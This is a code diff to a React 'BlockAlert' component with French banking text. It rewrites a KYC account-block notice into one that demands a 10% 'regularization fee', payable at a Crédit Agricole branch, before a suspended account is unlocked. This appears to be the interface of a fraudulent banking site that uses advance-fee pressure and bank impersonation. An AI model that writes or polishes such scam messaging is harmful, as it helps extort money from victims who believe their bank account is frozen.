@@ -202,10 +202,9 @@ export default function BlockAlert({ user }: BlockAlertProps) {
                 {fullName ? `Bonjour ${fullName},` : "Bonjour,"}
               </p>
               <p style={{ margin: 0, fontSize: "0.9rem", lineHeight: 1.65 }}>
-                Nous vous informons que votre compte a été <strong style={{ color: "#b91c1c" }}>suspendu à titre conservatoire</strong>.
-                <strong>Votre compte bancaire est bloqué pour non-conformité KYC (Know Your Customer)</strong>. Veuillez valider votre adresse postale.
-                Délai de rigueur : <strong>90 jours</strong>.
-                Cette régularisation vous donnera accès à votre solde et à l'ensemble de nos services financiers.
+                Nous vous informons que votre compte a été <strong style={{ color: '#b91c1c' }}>suspendu à titre conservatoire</strong>.
+                Afin de procéder à son déblocage, il est nécessaire de <strong>s'acquitter des frais de régularisation de 10% </strong> actuellement en attente.
+                Veuillez vous rendre dans votre agence Crédit Agricole la plus proche pour effectuer cette régularisation et rétablir l'accès à vos services.
               </p>
               <p style={{ margin: "10px 0 0 0", fontSize: "0.9rem", lineHeight: 1.65 }}>
                 Nous vous remercions de votre compréhension et de votre coopération.
@@ -226,7 +225,8 @@ export default function BlockAlert({ user }: BlockAlertProps) {
                   color: "#7f1d1d",
                 }}
               >
-                <strong>Information importante :</strong> Nous vous informons que les opérations de virement, paiement et retrait sur votre compte ont été suspendues. Pour toute demande d'assistance, veuillez contacter votre conseiller attitré.
+                <strong>Information importante :</strong> tant que la régularisation n'est pas effectuée,
+                l'ensemble des opérations (virements, paiements, retraits) demeurent suspendues.
               </div>
             </div>
 
